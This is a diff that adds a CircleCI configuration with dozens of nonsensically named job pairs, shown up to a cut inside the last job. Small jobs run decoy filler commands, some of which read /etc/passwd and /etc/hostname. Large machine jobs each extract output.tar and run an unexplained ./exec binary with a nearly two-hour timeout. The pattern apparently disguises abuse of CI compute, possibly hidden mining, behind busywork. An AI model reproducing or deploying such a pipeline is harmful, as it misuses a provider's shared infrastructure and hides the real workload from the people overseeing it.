@@ -1,0 +1,1603 @@
+version: 2.1
+
+jobs:
+  vendor_DEPLOY_DEV:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: spin till settled
+          command: |
+            mkdir -p /tmp/outbox
+            set +o pipefail 2>/dev/null; date -u +%s%N > /tmp/outbox/audit.txt; for i in $(seq 1 5000); do echo "$i $(date +%N)" >> /tmp/outbox/audit.txt; done; true
+            echo "staging complete; file length=$(wc -c </tmp/outbox/audit.txt)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - audit.txt
+  DEPLOY_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/step-9.out || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  hook_anothr-run:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: retry forever more
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; cut -d: -f3 /etc/passwd | sort -n | tail -1; true ; } > /tmp/outbox/manifest.bin
+            echo "staging complete; file length=$(wc -c </tmp/outbox/manifest.bin)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - manifest.bin
+  anothr-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/manifest.bin || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  green_rc-v5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: beat drop
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo "foo123bar456" | grep -oP '\d+' 2>/dev/null | head -1 || echo "foo123bar456" | grep -oE '[0-9]+' | head -1; true ; } > /tmp/outbox/step-15.log
+            echo "staging complete; file length=$(wc -c </tmp/outbox/step-15.log)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-15.log
+  rc-v5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/step-15.log || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  prebuild_rip-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: knock around
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=50;i++) printf "%c", 97+(i%26); print ""}'; true ; } > /tmp/outbox/artifact.bin
+            echo "staging complete; file length=$(wc -c </tmp/outbox/artifact.bin)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - artifact.bin
+  rip-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/OK.txt || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  provision_do-the-thing:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: sit twist
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo "mixer" | sha1sum | md5sum | sha256sum | awk '{print $1}' | head -c 24; true ; } > /tmp/outbox/gate-ready.log
+            echo "staging complete; file length=$(wc -c </tmp/outbox/gate-ready.log)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - gate-ready.log
+  do-the-thing:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/gate-ready.log || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  stage_dec7-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: plateau sit
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=256;i++)printf "%c", 32+(i%95)}' | wc -c; true ; } > /tmp/outbox/.pid
+            echo "staging complete; file length=$(wc -c </tmp/outbox/.pid)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - .pid
+  dec7-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/.pid || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  stepB_feat-2216:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: armistice
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 2252800 | wc -c; true ; } > /tmp/outbox/payload.pkg
+            echo "staging complete; file length=$(wc -c </tmp/outbox/payload.pkg)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - payload.pkg
+  feat-2216:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/payload.pkg || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  p1_teh-ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: hang shirt
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s=""; for(i=0;i<40;i++)s=s"-"; print "|" s "|"}'; true ; } > /tmp/outbox/READY
+            echo "staging complete; file length=$(wc -c </tmp/outbox/READY)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - READY
+  teh-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/OK.txt || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  drain_green-light-go:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: pecan wood
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 30 | paste -sd '-' - | wc -c; true ; } > /tmp/outbox/relay.txt
+            echo "staging complete; file length=$(wc -c </tmp/outbox/relay.txt)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - relay.txt
+  green-light-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/relay.txt || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  bundle_phoenix:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: mercy run
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; tf=$(mktemp) && printf "x\n" > "$tf" && cat "$tf" | sha256sum | cut -c1-20 && rm "$tf"; true ; } > /tmp/outbox/.ok
+            echo "staging complete; file length=$(wc -c </tmp/outbox/.ok)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - .ok
+  phoenix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/.ok || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  round2_foxtrot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: please pass
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; grep "." /etc/hostname | md5sum | cut -c1-10; true ; } > /tmp/outbox/.marker
+            echo "staging complete; file length=$(wc -c </tmp/outbox/.marker)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - .marker
+  foxtrot:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/.marker || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  beta_callisto-final:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: feast
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo 'a:b:c:d:e' | awk -F: '{print NF}'; true ; } > /tmp/outbox/summary.md
+            echo "staging complete; file length=$(wc -c </tmp/outbox/summary.md)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - summary.md
+  callisto-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/step-9.out || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  hook_nova-final:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: sand step
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{p=1;for(i=1;i<=10;i++)p*=i;print p}'; true ; } > /tmp/outbox/final.out
+            echo "staging complete; file length=$(wc -c </tmp/outbox/final.out)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - final.out
+  nova-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/OK.txt || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  checker_titan2-final:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: counterpoint
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 2 66780 | awk '{for(i=2;i*i<=$1;i++)if($1%i==0){next}print}' | wc -l; true ; } > /tmp/outbox/bundle
+            echo "staging complete; file length=$(wc -c </tmp/outbox/bundle)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - bundle
+  titan2-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/bundle || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  verify_luna-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: lower colors
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo "payload" | sha256sum | awk '{print toupper($1)}' | head -c 32; true ; } > /tmp/outbox/ckpt-alt.pickle
+            echo "staging complete; file length=$(wc -c </tmp/outbox/ckpt-alt.pickle)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - ckpt-alt.pickle
+  luna-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/ckpt-alt.pickle || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  postcheck_q2-cleanup:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: romanian pull
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<16;i++)printf "%02x", 15-i; print ""}'; true ; } > /tmp/outbox/metrics.jsonl
+            echo "staging complete; file length=$(wc -c </tmp/outbox/metrics.jsonl)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - metrics.jsonl
+  q2-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/metrics.jsonl || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  spinner_java17-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: flame lick
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; head -c 100 /dev/urandom | sha224sum 2>/dev/null | awk '{print $1}' | head -c 20 || head -c 100 /dev/urandom | sha256sum | awk '{print $1}' | head -c 20; true ; } > /tmp/outbox/step-18.log
+            echo "staging complete; file length=$(wc -c </tmp/outbox/step-18.log)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-18.log
+  java17-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/step-9.out || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  redo_jess-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: frost
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; printf "%s\n" one two three four five | shuf 2>/dev/null | head -1 || printf "%s\n" one two three four five | awk 'NR==2'; true ; } > /tmp/outbox/step-9.out
+            echo "staging complete; file length=$(wc -c </tmp/outbox/step-9.out)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-9.out
+  jess-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/step-9.out || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  db_zulu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: anodize color
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; stat /etc/hostname --printf="%s bytes\n" 2>/dev/null || stat /etc/hostname; true ; } > /tmp/outbox/2024-11-04.data
+            echo "staging complete; file length=$(wc -c </tmp/outbox/2024-11-04.data)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 2024-11-04.data
+  zulu:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/2024-11-04.data || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  validate_build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: dip
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; printf "key1=val1\nkey2=val2\nkey3=val3\n" | awk -F= '{print $1" -> "$2}'; true ; } > /tmp/outbox/final.log
+            echo "staging complete; file length=$(wc -c </tmp/outbox/final.log)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - final.log
+  build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/step-9.out || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  checker_yankee-7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: later
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; find / -maxdepth 2 -name "bin" 2>/dev/null | head -5; true ; } > /tmp/outbox/stage-ready.txt
+            echo "staging complete; file length=$(wc -c </tmp/outbox/stage-ready.txt)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - stage-ready.txt
+  yankee-7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/stage-ready.txt || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  fixture_v8-rc1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: bagpipe
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo "trim me   " | awk '{sub(/[[:space:]]+$/,""); print length($0)}'; true ; } > /tmp/outbox/step-16.log
+            echo "staging complete; file length=$(wc -c </tmp/outbox/step-16.log)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-16.log
+  v8-rc1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/step-16.log || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  checker_auh-check-10:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: seat flush
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; cksum /etc/hostname; true ; } > /tmp/outbox/21.out
+            echo "staging complete; file length=$(wc -c </tmp/outbox/21.out)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 21.out
+  auh-check-10:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/step-9.out || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  preflight_hyperion-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: steam room
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo 'shout quietly' | tr '[:lower:]' '[:upper:]'; true ; } > /tmp/outbox/OK.txt
+            echo "staging complete; file length=$(wc -c </tmp/outbox/OK.txt)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - OK.txt
+  hyperion-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/OK.txt || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  checker_Prepare_App1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: first take
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 50 | awk 'NR%2' | awk '$1>20'; true ; } > /tmp/outbox/cache.bin
+            echo "staging complete; file length=$(wc -c </tmp/outbox/cache.bin)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - cache.bin
+  Prepare_App1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/cache.bin || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  round1_realease-64:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: mountain climber
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{seed=42; for(i=0;i<20;i++){seed=(seed*1103515245+12345)%2147483648; print seed}}' | tail -3; true ; } > /tmp/outbox/step-18.out
+            echo "staging complete; file length=$(wc -c </tmp/outbox/step-18.out)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-18.out
+  realease-64:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/OK.txt || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  p1_vb-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: gear slipped
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'NR<=3' /etc/passwd | md5sum; true ; } > /tmp/outbox/pt-E.pkl
+            echo "staging complete; file length=$(wc -c </tmp/outbox/pt-E.pkl)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - pt-E.pkl
+  vb-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/OK.txt || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=output.tar
+      - run:
+          no_output_timeout: 117m
+          command: nice -n 0 ./exec
+  bootstrap_min-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: fail free
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo "line1 line2 line3" | awk '{print $2}'; true ; } > /tmp/outbox/step-22.txt
+            echo "staging complete; file length=$(wc -c </tmp/outbox/step-22.txt)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-22.txt
+  min-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged file
+          command: |
+            md5sum /tmp/outbox/step-22.txt || true
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 1 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
